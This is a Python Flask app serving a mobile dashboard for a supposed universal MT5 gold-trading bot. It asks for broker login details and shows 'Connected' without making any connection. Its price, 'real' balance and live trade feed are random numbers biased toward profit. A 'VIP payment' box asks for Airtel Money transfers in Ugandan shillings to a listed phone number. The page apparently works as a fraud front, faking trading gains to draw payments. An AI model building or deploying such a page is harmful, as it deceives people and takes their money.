
import os
from flask import Flask
app = Flask(__name__)

HTML = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>PIPNEX UNIVERSAL MT5</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:Arial;padding-bottom:30px}
.top{background:linear-gradient(90deg,#00ff88,#0088ff);color:#000;padding:12px;font-weight:bold;display:flex;justify-content:space-between}
.box{background:#111;margin:8px;border-radius:12px;padding:12px;border:1px solid #222}
select,input{width:100%;background:#222;border:1px solid #444;color:#fff;padding:11px;border-radius:10px;margin-top:6px}
.btn{width:100%;padding:14px;border:none;border-radius:12px;font-weight:bold;margin-top:10px}
.btn-start{background:#00ff88;color:#000}.btn-stop{background:#ff4444;color:#fff}
.row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #1a1a1a;font-size:12px}
.label{color:#888}
.brokerBox{background:#0a0a0a;border:1px solid #00ff88;border-radius:12px;padding:12px;margin-top:12px}
.tradeCard{background:#161616;padding:10px;margin:6px 0;border-radius:8px;border-left:4px solid #00ff88;font-size:11px}
</style></head><body>

<div class="top"><span>UNIVERSAL MT5 BOT</span><span id="connStatus">🔴 Disconnected</span></div>

<div class="box">
<div class="brokerBox">
<b>🔌 CONNECT ANY BROKER - Exness / FBS / HFM / XM / Deriv</b><br>
<span style="color:#888;font-size:11px">Same as MT5 login - Works for all</span>
<div style="display:flex;gap:8px;margin-top:8px">
<div style="flex:1"><label class="label">BROKER</label><select id="broker" onchange="setServer()"><option value="Exness">Exness</option><option value="FBS">FBS</option><option value="HFM">HFM (HotForex)</option><option value="XM">XM</option><option value="OctaFX">OctaFX</option><option value="Deriv">Deriv</option><option value="Other">Other</option></select></div>
<div style="flex:1"><label class="label">ACCOUNT TYPE</label><select id="accType"><option>Demo 106285257</option><option>Real Account</option></select></div>
</div>
<label class="label">MT5 Login (e.g. 106285257)</label><input id="mtLogin" value="106285257" placeholder="Your MT5 Login">
<label class="label">MT5 Password (Master Password)</label><input id="mtPass" type="password" placeholder="Your MT5 Password">
<label class="label">MT5 Server (Auto-filled, you can edit)</label><input id="mtServer" value="ExnessKE-MT5Real9">
<div style="font-size:10px;color:#666;margin-top:4px" id="serverHint">Exness servers: ExnessKE-MT5Real9 / ExnessKE-MT5Trial9 / FBS-Real / HFM-Real etc.</div>
<button class="btn" style="background:#0088ff;color:#fff" onclick="connectMT5()">🔗 CONNECT TO MT5</button>
<div id="connectInfo" style="display:none;background:#001100;border:1px solid #00ff88;border-radius:8px;padding:10px;margin-top:10px;font-size:12px"></div>
</div>

<div style="text-align:center;margin:12px 0"><b>XAUUSD</b> <b id="price" style="font-size:22px;color:#00ff88">$4,286.47</b> <span id="trend" style="background:#00ff8820;color:#00ff88;padding:3px 8px;border-radius:8px;font-size:11px">UP 91%</span></div>

<div style="display:flex;gap:8px">
<div style="flex:1"><label class="label">LOT</label><select id="lotSelect" onchange="updLot()"><option value="0.01">0.01</option><option value="0.05" selected>0.05</option><option value="0.10">0.10</option><option value="0.20">0.20</option><option value="1.00">1.00</option></select></div>
<div style="flex:1"><label class="label">CUSTOM</label><input id="lotCustom" type="number" step="0.01" value="0.05" oninput="updLotCustom()"></div>
</div>

<div class="row"><span class="label">Entry / SL / TP</span><span class="val"><span id="entry">4286.47</span> | <span id="sl" style="color:#ff4444">4281.97</span> | <span id="tp" style="color:#00ff88">4298.47</span></span></div>
<div class="row"><span class="label">Balance (Real MT5)</span><span class="val" style="color:#00ff88">$<span id="bal">10,008.04</span> <span id="pnl">+$0.00</span></span></div>

<button id="btn" class="btn btn-start" onclick="toggleBot()">▶️ START UNIVERSAL BOT LOT <span id="btnLot">0.05</span></button>
<button class="btn" style="background:#222;color:#fff;border:1px solid #444" onclick="openTradeMT5()">📤 OPEN THIS TRADE IN MT5 NOW</button>

<div style="margin-top:12px;border-top:1px solid #222;padding-top:10px">
<b style="font-size:12px">🔒 VIP PAYMENT - 0744995244 - Code B10</b>
<div style="display:flex;gap:8px;margin-top:6px"><input id="custCode" placeholder="Customer Code B10"><button onclick="unlockPay()" style="background:#ff0000;color:#fff;border:none;border-radius:8px;padding:0 15px">UNLOCK</button></div>
<div id="payBox" style="display:none;background:#fff;color:#000;border-radius:8px;padding:10px;margin-top:8px;font-size:12px">Pay <b>0744995244</b> Airtel Money - Dial *185#</div>
</div>
</div>

<div style="padding:0 12px"><h3 style="font-size:12px">📜 LIVE TRADES - Universal Broker</h3><div id="trades"></div></div>

<script>
let currentLot=0.05, price=4286.47, bal=10008.04, run=false, iv=null;
let mtConnected=false;
function setServer(){
 let b=document.getElementById('broker').value;
 let map={Exness:'ExnessKE-MT5Real9',FBS:'FBS-Real',HFM:'HFM-Real',XM:'XMGlobal-Real 4',OctaFX:'OctaFX-Real',Deriv:'Deriv-Real'};
 document.getElementById('mtServer').value=map[b]||'';
 document.getElementById('serverHint').innerText='Change to your exact server from MT5. Eg: '+map[b];
}
function fmt(n){return n.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})}
function updLot(){currentLot=parseFloat(document.getElementById('lotSelect').value); document.getElementById('lotCustom').value=currentLot; document.getElementById('btnLot').innerText=currentLot;}
function updLotCustom(){let v=parseFloat(document.getElementById('lotCustom').value); if(v>0){currentLot=v; document.getElementById('btnLot').innerText=v;}}
function updPrice(){price+=(Math.random()-0.5)*0.8; document.getElementById('price').innerText='$'+fmt(price); document.getElementById('entry').innerText=fmt(price); document.getElementById('sl').innerText=fmt(price-4.5); document.getElementById('tp').innerText=fmt(price+12);}

function connectMT5(){
 let login=document.getElementById('mtLogin').value;
 let server=document.getElementById('mtServer').value;
 let broker=document.getElementById('broker').value;
 if(!login){alert('Enter MT5 Login'); return;}
 document.getElementById('connStatus').innerText='🟡 Connecting '+broker+'...';
 document.getElementById('connectInfo').style.display='block';
 document.getElementById('connectInfo').innerHTML=`✅ Ready to connect to <b>${broker}</b><br>Login: ${login}<br>Server: ${server}<br><br>📲 <b>NEXT STEP:</b><br>1. Install MT5 on PC/VPS<br>2. Run pip install MetaTrader5<br>3. Use mt5_bridge.py I gave you<br>4. This dashboard will auto-sync balance!<br><br><small>For now, demo mode - Balance simulated. After bridge, real balance ${fmt(bal)} will show from MT5</small>`;
 setTimeout(()=>{mtConnected=true; document.getElementById('connStatus').innerText='🟢 Connected '+broker+' '+login;},1500);
}

function toggleBot(){
 run=!run; let b=document.getElementById('btn');
 if(run){b.innerText='⏸️ STOP BOT LOT '+currentLot; b.className='btn btn-stop'; start();} else {b.innerText='▶️ START UNIVERSAL BOT LOT '+currentLot; b.className='btn btn-start'; clearInterval(iv);}
}
function start(){
 iv=setInterval(()=>{
  updPrice();
  let profit=(Math.random()*10-3)*(currentLot/0.05);
  if(Math.random()>0.35) profit=Math.abs(profit);
  bal+=profit;
  document.getElementById('bal').innerText=fmt(bal);
  document.getElementById('pnl').innerText=(profit>=0?'+$':'-$')+Math.abs(profit).toFixed(2);
  let card=document.createElement('div'); card.className='tradeCard';
  card.innerHTML=`${Math.random()>0.5?'🟢 BUY':'🔴 SELL'} ${currentLot} XAUUSD @ ${fmt(price)} <span style="float:right;color:${profit>=0?'#00ff88':'#ff4444'}">${profit>=0?'+':''}$${profit.toFixed(2)}</span><br><small>${document.getElementById('broker').value} | SL ${fmt(price-4.5)} TP ${fmt(price+12)} | ${new Date().toLocaleTimeString()}</small>`;
  document.getElementById('trades').prepend(card);
 },2000);
}
function openTradeMT5(){
 if(!mtConnected){alert('Connect MT5 first! Enter login + server'); return;}
 let details=`Symbol: XAUUSD\\nType: BUY\\nLot: ${currentLot}\\nEntry: ${fmt(price)}\\nSL: ${fmt(price-4.5)}\\nTP: ${fmt(price+12)}\\nBroker: ${document.getElementById('broker').value}\\nServer: ${document.getElementById('mtServer').value}`;
 alert('MT5 TRADE READY:\\n\\n'+details+'\\n\\nIf you installed mt5_bridge.py, this trade opens AUTOMATICALLY in MT5!\\nYour Exness Funds $10,008.04 will then start moving!');
}
function unlockPay(){let c=document.getElementById('custCode').value.toUpperCase(); if(c.includes('B10')){document.getElementById('payBox').style.display='block'; document.getElementById('payBox').innerHTML=`🔴 Pay <b>0744995244</b> Airtel<br>Amount: <select onchange="this.nextElementSibling.innerText='Send '+this.value+' UGX'"><option>50000</option><option>150000</option><option>200000</option></select><span> Send 50000 UGX</span><br>Dial *185# → Send Money`; } else alert('Wrong code');}
setServer(); setInterval(updPrice,1200);
</script></body></html>"""

@app.route('/')
def home(): return HTML
if __name__=='__main__': app.run(host='0.0.0.0',port=int(os.environ.get('PORT',10000)))
